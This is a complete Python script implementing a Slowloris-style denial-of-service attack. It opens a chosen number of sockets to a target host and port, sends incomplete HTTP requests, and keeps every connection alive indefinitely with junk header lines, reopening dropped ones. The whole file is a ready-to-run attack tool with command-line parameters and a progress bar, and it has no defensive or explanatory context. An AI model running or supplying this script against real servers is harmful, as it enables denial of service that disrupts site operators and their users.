#!/usr/bin/env python3  # Ensure the script uses Python 3

import sys
import random
import socket
import time
from progress.bar import Bar

# Define regular headers for the HTTP requests
regular_headers = [
    "User-agent: Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
    "Accept-language: en-US,en;q=0.5"
]

def init_socket(ip, port):
    """Initialize a socket connection and send initial HTTP request headers."""
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(4)
    try:
        s.connect((ip, int(port)))
        # Send a GET request with a random query parameter
        s.send(f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\n".encode('UTF-8'))
        
        for header in regular_headers:
            s.send(f'{header}\r\n'.encode('UTF-8'))

        # Send a final CRLF to end the headers
        s.send(b'\r\n')
    except socket.error as e:
        print(f"Socket error: {e}")
        s.close()
        return None

    return s

def main():
    """Main function to set up sockets and send keep-alive headers."""
    if len(sys.argv) < 5:
        print(f"Usage: {sys.argv[0]} example.com 80 100 10")
        return

    ip = sys.argv[1]
    port = sys.argv[2]
    socket_count = int(sys.argv[3])
    timer = int(sys.argv[4])
    socket_list = []

    # Create sockets
    bar = Bar('\033[1;32;40m Creating Sockets...', max=socket_count)

    for _ in range(socket_count):
        s = init_socket(ip, port)
        if s:
            socket_list.append(s)
            next(bar)

    bar.finish()

    # Keep-alive loop
    while True:
        print(f"\033[0;37;40m Sending Keep-Alive Headers to {len(socket_list)}")

        # Send keep-alive headers
        for s in socket_list:
            try:
                s.send(f"X-a {random.randint(1, 5000)}\r\n".encode('UTF-8'))
            except socket.error:
                socket_list.remove(s)

        # Recreate sockets if needed
        while len(socket_list) < socket_count:
            print("\033[1;34;40m Re-creating Socket...")
            s = init_socket(ip, port)
            if s:
                socket_list.append(s)

        time.sleep(timer)

if __name__ == "__main__":
    main()
